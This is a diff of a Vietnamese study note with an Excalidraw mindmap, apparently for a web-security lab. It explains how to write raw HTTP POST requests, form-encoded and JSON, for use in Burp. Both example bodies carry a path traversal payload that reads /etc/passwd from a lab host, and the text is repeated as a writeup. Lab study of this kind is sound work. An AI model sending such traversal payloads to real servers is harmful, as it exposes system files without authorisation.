@@ -6,10 +6,10 @@ tags:
 ---
 
 
-<div class="excalidraw-container" id="ex-p8vbj2">
+<div class="excalidraw-container" id="ex-epxch1">
   <div class="excalidraw-toolbar">
     <div class="excalidraw-badge">
-      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 19l7-7 3 3-7 7-3-3z"></path><path d="M18 13l-1.5-7.5L2 2l3.5 14.5L13 18l5-5z"></path><path d="M2 2l7.586 7.586"></path><circle cx="11" cy="11" r="2"></circle></svg>
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
       <span>Excalidraw Mindmap</span>
     </div>
     <div class="excalidraw-controls">
@@ -22,6 +22,9 @@ tags:
   <div class="excalidraw-viewport">
     <div class="excalidraw-canvas-wrapper">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1358 1691" class="excalidraw-svg" data-width="1358" data-height="1691">
+<a href="../0-asset/pasted-image-20260829184508_474.png" class="excalidraw-node-link external" target="_blank" rel="noopener" title="Xem ảnh: Pasted Image 20260829184508_474.png"><g transform="translate(20.45,-21.59)">
+<image x="161.4174907521483" y="74.87666320800781" width="710.3793991878831" height="684.8754102503146" href="../0-asset/pasted-image-20260829184508_474.png" preserveAspectRatio="xMidYMid meet" class="excalidraw-embedded-img"/>
+</g></a>
 <g transform="translate(20.45,-21.59)">
 <path d="M384.99 234.08 L386.86 234.97 L386.86 234.97" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
 </g>
@@ -34,11 +37,57 @@ tags:
 <g transform="translate(20.45,-21.59)">
 <path d="M208.35 227.55 L208.67 228.38 L209.79 228.62 L212.41 229.15 L213.53 229.39 L215.98 229.80 L218.49 230.22 L221.21 230.58 L223.93 230.99 L226.86 231.35 L229.95 231.70 L233.53 232.06 L237.05 232.36 L238.91 232.60 L244.89 233.01 L248.89 233.31 L252.73 233.66 L256.41 234.02 L259.87 234.38 L263.02 234.67 L266.17 235.03 L269.37 235.33 L270.97 235.39 L274.11 235.68 L277.31 235.86 L280.41 236.10 L284.99 236.40 L288.03 236.69 L290.97 236.81 L293.74 237.05 L296.46 237.11 L297.85 237.17 L300.41 237.41 L303.02 237.47 L305.58 237.53 L308.25 237.47 L310.91 237.41 L313.47 237.29 L316.03 237.11 L320.09 236.81 L322.59 236.57 L323.87 236.46 L326.43 236.16 L328.94 235.86 L331.55 235.51 L333.90 235.15 L336.25 234.67 L338.65 234.14 L340.94 233.66 L343.13 233.07 L344.25 232.77 L347.23 231.88 L349.10 231.23 L350.81 230.52 L351.61 230.22 L352.83 229.57 L353.74 228.91 L354.54 228.26 L355.13 227.55 L355.55 226.83 L355.77 226.00 L355.18 222.56 L353.85 220.36 L351.61 218.16 L348.62 216.26 L344.67 214.24 L340.14 212.46 L337.79 211.57 L332.51 209.96 L326.54 208.36 L319.55 206.81 L312.19 205.33 L304.46 204.02 L290.43 201.94 L280.62 200.76 L271.39 200.22 L266.81 200.04 L255.50 199.87 L246.17 199.98 L235.18 200.40 L226.43 200.99 L216.46 201.83 L207.71 202.72 L199.98 203.49 L178.86 206.22 L176.62 206.58 L172.62 207.41 L169.10 208.42 L166.01 209.61 L163.45 210.74 L161.42 212.04 L159.82 213.59 L158.75 215.49 L158.33 216.44 L157.85 218.70 L158.22 222.26 L158.97 224.69 L160.30 227.13 L172.41 233.43 L175.39 233.78 L178.70 233.96 L187.02 233.72 L198.70 232.42 L198.70 232.42" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
 </g>
+<a href="../0-asset/pasted-image-20260829184637_793.png" class="excalidraw-node-link external" target="_blank" rel="noopener" title="Xem ảnh: Pasted Image 20260829184637_793.png"><g transform="translate(20.45,-21.59)">
+<image x="898.43019209655" y="196.4666290283203" width="398.6701944201813" height="440.13589133355856" href="../0-asset/pasted-image-20260829184637_793.png" preserveAspectRatio="xMidYMid meet" class="excalidraw-embedded-img"/>
+</g></a>
 <g transform="translate(20.45,-21.59)">
 <path d="M757.05 340.53 L757.69 339.75 L758.43 339.22 L760.78 337.91 L762.81 336.90 L763.93 336.43 L766.54 335.48 L769.69 334.53 L773.10 333.76 L776.83 333.04 L780.57 332.45 L784.35 331.97 L788.19 331.56 L794.01 331.02 L797.85 330.90 L799.87 330.84 L803.93 330.67 L808.03 330.67 L812.19 330.67 L816.41 330.67 L820.78 330.67 L825.10 330.67 L829.42 330.73 L833.63 330.84 L835.77 330.90 L839.93 331.02 L845.69 331.32 L848.99 331.50 L852.03 331.68 L854.86 331.85 L857.37 332.03 L859.71 332.21 L860.73 332.27 L862.43 332.39 L863.87 332.45 L865.10 332.45 L866.17 332.57 L867.39 332.57 L868.41 332.63 L869.69 332.63 L870.70 332.69 L871.77 332.80 L872.78 332.92 L873.79 333.10 L874.75 333.28 L875.77 333.40 L876.73 333.64 L877.79 333.81 L879.13 334.29 L880.14 334.53 L881.58 335.00 L882.86 335.36 L883.87 335.72 L884.83 336.07 L885.58 336.37 L886.38 336.73 L887.45 337.08 L889.05 337.68 L890.75 338.27 L893.21 338.98 L895.07 339.64 L896.62 340.05 L897.58 340.41 L900.03 341.24 L901.74 341.77 L902.59 342.13 L904.41 342.84 L906.17 343.73 L907.98 344.74 L909.90 345.99 L911.82 347.48 L915.13 350.33 L917.53 352.53 L920.03 354.90 L921.21 356.21 L923.71 358.76 L926.11 361.44 L928.46 364.23 L930.75 367.02 L932.89 369.93 L934.91 372.90 L936.94 375.99 L938.86 379.08 L940.57 382.11 L942.22 385.20 L943.71 388.29 L945.15 391.31 L946.54 394.17 L947.82 397.02 L948.89 399.63 L949.95 402.07 L950.97 404.32 L951.39 405.51 L952.25 407.71 L953.05 409.79 L954.06 412.82 L954.70 414.72 L954.97 415.73 L955.50 417.33 L955.87 418.58 L956.62 420.66 L957.15 422.14 L957.58 423.27 L958.01 424.34 L958.27 425.17 L958.59 426.06 L959.07 427.13 L959.50 428.14 L959.93 429.15 L960.46 429.98 L961.15 431.29 L961.74 432.36 L962.22 433.31 L962.75 434.08 L963.23 434.74 L963.87 435.57 L964.51 436.40 L965.26 437.11 L966.11 438.00 L966.70 438.60 L967.55 439.43 L968.41 440.14 L969.10 440.80 L969.74 441.39 L970.33 441.86 L971.18 442.52 L971.98 443.11 L972.67 443.53 L973.42 444.06 L974.11 444.48 L974.86 444.95 L975.55 445.49 L976.41 445.96 L977.79 446.97 L978.86 447.69 L979.82 448.22 L980.51 448.70 L981.15 449.11 L981.95 449.71 L982.59 450.12 L983.23 450.54 L983.87 451.07 L983.87 451.07" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
 </g>
 <g transform="translate(20.45,-21.59)">
 <path d="M983.61 444.42 L983.82 443.17 L984.09 442.16 L984.25 441.27 L984.41 440.26 L984.94 443.23 L985.53 445.19 L985.90 446.62 L986.17 447.92 L986.33 449.05 L986.38 450.42 L986.17 451.25 L985.58 452.56 L984.19 454.10 L981.90 455.53 L979.02 456.77 L974.33 458.08 L971.55 458.68 L968.78 458.97 L967.45 459.03 L967.45 459.03" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+</g>
+<g transform="translate(20.45,-21.59)">
+
+<rect x="233.74862670898438" y="922.4870758056641" width="800" height="750" rx="8" fill="#ffffff" stroke="#e0e0e0" stroke-width="1.5" class="excalidraw-md-bg"/>
+<foreignObject x="233.74862670898438" y="922.4870758056641" width="800" height="750" class="excalidraw-foreign-md">
+  <div xmlns="http://www.w3.org/1999/xhtml" class="notion-embed-card">
+    <div class="notion-embed-header">
+      <div class="notion-embed-header-left">
+        <span class="notion-embed-icon">📝</span>
+        <span class="notion-embed-title">Ghi chú Markdown</span>
+      </div>
+      <a href="#doc-677b6bff0cd4e28891d58ca69568edd09bdca4bc" class="notion-embed-jump" title="Cuộn xuống đọc chi tiết toàn bộ nội dung">↓ Đọc bài viết</a>
+    </div>
+    <div class="notion-embed-body">
+      <p>Cấu trúc thô của một request HTTP POST gồm 3 phần: Dòng khởi tạo, các dòng Header, và phần Body chứa tham số.</p>
+<p>Dạng 1: Form dữ liệu web thông thường (hay gặp nhất trong lab PHP)</p>
+<pre><code class="language-http">POST /challenges/chall1.php HTTP/1.1
+Host: 10.49.153.49
+User-Agent: Mozilla/5.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+
+file=../../../../etc/passwd
+</code></pre>
+<p>Dạng 2: Dữ liệu dạng JSON (khi test API)</p>
+<pre><code class="language-http">POST /api/v1/user HTTP/1.1
+Host: 10.49.153.49
+Content-Type: application/json
+Content-Length: 35
+
+{&quot;file&quot;: &quot;../../../../etc/passwd&quot;}
+</code></pre>
+<p>3 nguyên tắc sống còn khi nhìn hoặc gõ:</p>
+<ul>
+<li>Dòng đầu tiên: Đổi GET thành POST, giữ lại đường dẫn file và bỏ toàn bộ đoạn <code>?file=...</code> phía sau đi.</li>
+<li>Bắt buộc có Content-Type: Nếu không có dòng này, backend sẽ không biết giải mã body theo kiểu gì.</li>
+<li>Dòng trống ngăn cách: Giữa dòng Header cuối cùng và phần Body bắt buộc phải có đúng một dòng trống (bấm Enter một phát). Nếu thiếu dòng trống này, server sẽ coi Body là Header và báo lỗi ngay. Thằng Burp sẽ tự đếm ký tự để tính Content-Length nên mày không cần tính tay.</li>
+</ul>
+
+    </div>
+  </div>
+</foreignObject>
+
 </g>
 <g transform="translate(20.45,-21.59)">
 <path d="M438.01 929.99 L437.69 930.82 L437.69 930.82" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
@@ -80,3 +129,48 @@ tags:
     </div>
   </div>
 </div>
+
+
+---
+
+## 📖 Nội dung chi tiết bài viết (Writeup)
+
+<div id="doc-677b6bff0cd4e28891d58ca69568edd09bdca4bc" class="notion-callout-card">
+
+Cấu trúc thô của một request HTTP POST gồm 3 phần: Dòng khởi tạo, các dòng Header, và phần Body chứa tham số.
+
+Dạng 1: Form dữ liệu web thông thường (hay gặp nhất trong lab PHP)
+
+```http
+POST /challenges/chall1.php HTTP/1.1
+Host: 10.49.153.49
+User-Agent: Mozilla/5.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+
+file=../../../../etc/passwd
+
+```
+
+Dạng 2: Dữ liệu dạng JSON (khi test API)
+
+```http
+POST /api/v1/user HTTP/1.1
+Host: 10.49.153.49
+Content-Type: application/json
+Content-Length: 35
+
+{"file": "../../../../etc/passwd"}
+
+```
+
+3 nguyên tắc sống còn khi nhìn hoặc gõ:
+
+* Dòng đầu tiên: Đổi GET thành POST, giữ lại đường dẫn file và bỏ toàn bộ đoạn `?file=...` phía sau đi.
+* Bắt buộc có Content-Type: Nếu không có dòng này, backend sẽ không biết giải mã body theo kiểu gì.
+* Dòng trống ngăn cách: Giữa dòng Header cuối cùng và phần Body bắt buộc phải có đúng một dòng trống (bấm Enter một phát). Nếu thiếu dòng trống này, server sẽ coi Body là Header và báo lỗi ngay. Thằng Burp sẽ tự đếm ký tự để tính Content-Length nên mày không cần tính tay.
+
+</div>
+
+---
+
